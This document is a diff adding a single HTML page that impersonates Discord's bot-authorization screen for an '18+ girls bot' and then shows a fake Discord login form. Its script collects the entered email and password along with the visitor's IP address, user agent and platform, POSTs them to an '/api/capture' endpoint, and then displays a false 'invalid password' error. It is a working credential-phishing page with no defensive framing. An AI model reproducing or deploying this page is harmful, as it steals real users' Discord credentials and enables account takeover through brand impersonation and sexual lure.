@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord - Authorize</title>
+    <link rel="icon" href="https://discord.com/assets/favicon.ico">
+    <style>
+        @font-face {
+            font-family: 'gg sans';
+            src: url('https://cdn.jsdelivr.net/gh/ryanoasis/discord-fonts@main/gg-sans/gg-sans-400.woff2') format('woff2');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: 'gg sans';
+            src: url('https://cdn.jsdelivr.net/gh/ryanoasis/discord-fonts@main/gg-sans/gg-sans-600.woff2') format('woff2');
+            font-weight: 600;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "gg sans", -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #1a1b1e;
+            min-height: 100vh;
+            color: #dbdee1;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            position: relative;
+            height: 56px;
+        }
+        .back-btn {
+            position: absolute;
+            left: 16px;
+            color: #b5bac1;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .header-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 8px 16px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .avatar-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 0 16px;
+        }
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #1a1b1e;
+            object-fit: cover;
+        }
+        .avatar-left {
+            margin-right: -12px;
+            z-index: 2;
+        }
+        .avatar-right {
+            margin-left: -12px;
+            opacity: 0.6;
+        }
+        .connection-line {
+            display: flex;
+            gap: 3px;
+            margin: 0 4px;
+        }
+        .dot {
+            width: 4px;
+            height: 4px;
+            background: #4f545c;
+            border-radius: 50%;
+        }
+        .bot-info {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .bot-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .bot-subtitle {
+            font-size: 16px;
+            color: #b5bac1;
+        }
+        .permissions-card {
+            background: #2b2d31;
+            border-radius: 16px;
+            padding: 20px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .permissions-title {
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+        .dev-name {
+            font-weight: 600;
+        }
+        .permission-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+        .permission-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            font-size: 14px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .icon-check {
+            background: #3ba55d;
+            color: #fff;
+        }
+        .icon-x {
+            background: #4f545c;
+            color: #b5bac1;
+            font-size: 12px;
+        }
+        .divider {
+            height: 1px;
+            background: #1e1f22;
+            margin: 16px 0;
+        }
+        .policy-text {
+            font-size: 14px;
+            color: #b5bac1;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+        .policy-text a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+        .info-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #b5bac1;
+        }
+        .info-icon {
+            margin-right: 8px;
+        }
+        .security-text {
+            font-size: 14px;
+            color: #b5bac1;
+        }
+        .security-text strong {
+            color: #dbdee1;
+        }
+        .authorize-btn {
+            width: 100%;
+            background: #5865f2;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 28px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto;
+        }
+        .authorize-btn:active {
+            transform: scale(0.98);
+            background: #4752c4;
+        }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1b1e;
+            z-index: 10000;
+            overflow-y: auto;
+        }
+        .modal-content {
+            min-height: 100vh;
+            padding: 24px 16px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .login-header {
+            text-align: center;
+            margin: 48px 0 32px;
+        }
+        .login-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .login-subtitle {
+            font-size: 16px;
+            color: #b5bac1;
+        }
+        .error-msg {
+            background: #f23f43;
+            color: #fff;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            background: #1e1f22;
+            border: 1px solid #1e1f22;
+            border-radius: 4px;
+            color: #dbdee1;
+            font-size: 16px;
+            outline: none;
+        }
+        .form-input:focus {
+            border-color: #5865f2;
+        }
+        .forgot-link {
+            display: block;
+            color: #00a8fc;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        .login-submit {
+            width: 100%;
+            background: #5865f2;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .register-text {
+            text-align: center;
+            color: #949ba4;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+        .register-text a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="back-btn" onclick="goBack()">←</span>
+        <span class="header-title">Authorize</span>
+    </div>
+    
+    <div class="container">
+        <div class="avatar-section">
+            <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=200&h=200&fit=crop&crop=face" class="avatar avatar-left" id="botAvatar">
+            <div class="connection-line">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <img src="https://cdn.discordapp.com/embed/avatars/1.png" class="avatar avatar-right">
+        </div>
+        
+        <div class="bot-info">
+            <h1 class="bot-name">18+ girls bot</h1>
+            <p class="bot-subtitle">wants to access your Discord account</p>
+        </div>
+        
+        <div class="permissions-card">
+            <p class="permissions-title">This will allow the developer of <span class="dev-name">18+ girls bot</span> to:</p>
+            
+            <div class="permission-item">
+                <span class="permission-icon icon-check">✓</span>
+                <span>Create commands</span>
+            </div>
+            
+            <div class="permission-item">
+                <span class="permission-icon icon-check">✓</span>
+                <span>Send you direct messages</span>
+            </div>
+            
+            <div class="permission-item">
+                <span class="permission-icon icon-x">✕</span>
+                <span>Read you a bedtime story</span>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <p class="policy-text">
+                The developer of <span class="dev-name">18+ girls bot</span>'s <a href="#">privacy policy</a> and <a href="#">terms of service</a> apply to this application.
+            </p>
+            
+            <div class="info-row">
+                <span class="info-icon">🕐</span>
+                <span>Active since Dec 11, 2024</span>
+            </div>
+            
+            <p class="security-text">
+                This application <strong>cannot</strong> read your messages or send messages as you.
+            </p>
+        </div>
+        
+        <button class="authorize-btn" onclick="showLogin()">Authorize</button>
+    </div>
+
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal-content">
+            <div class="login-header">
+                <h2 class="login-title">Welcome back!</h2>
+                <p class="login-subtitle">We're so excited to see you again!</p>
+            </div>
+            
+            <div class="error-msg" id="errorMsg">Login or password is invalid.</div>
+            
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label class="form-label">Email or Phone Number</label>
+                    <input type="text" class="form-input" id="email" autocomplete="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">Password</label>
+                    <input type="password" class="form-input" id="password" autocomplete="current-password" required>
+                </div>
+                
+                <a href="#" class="forgot-link">Forgot your password?</a>
+                
+                <button type="submit" class="login-submit" id="loginBtn">
+                    <span class="loading" id="spinner"></span>
+                    <span id="btnText">Log In</span>
+                </button>
+                
+                <p class="register-text">
+                    Need an account? <a href="#">Register</a>
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'unknown';
+            }
+        }
+        
+        function showLogin() {
+            document.getElementById('loginModal').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            document.getElementById('email').focus();
+        }
+        
+        function goBack() {
+            if (document.getElementById('loginModal').style.display === 'block') {
+                document.getElementById('loginModal').style.display = 'none';
+                document.body.style.overflow = 'auto';
+            } else {
+                window.location.href = 'https://discord.com';
+            }
+        }
+        
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            const spinner = document.getElementById('spinner');
+            const btnText = document.getElementById('btnText');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            btn.disabled = true;
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Logging in...';
+            errorMsg.style.display = 'none';
+            
+            const ip = await getIP();
+            
+            try {
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email,
+                        password,
+                        ip,
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
+                    })
+                });
+            } catch(e) {}
+            
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                btnText.textContent = 'Log In';
+                btn.disabled = false;
+                errorMsg.style.display = 'block';
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
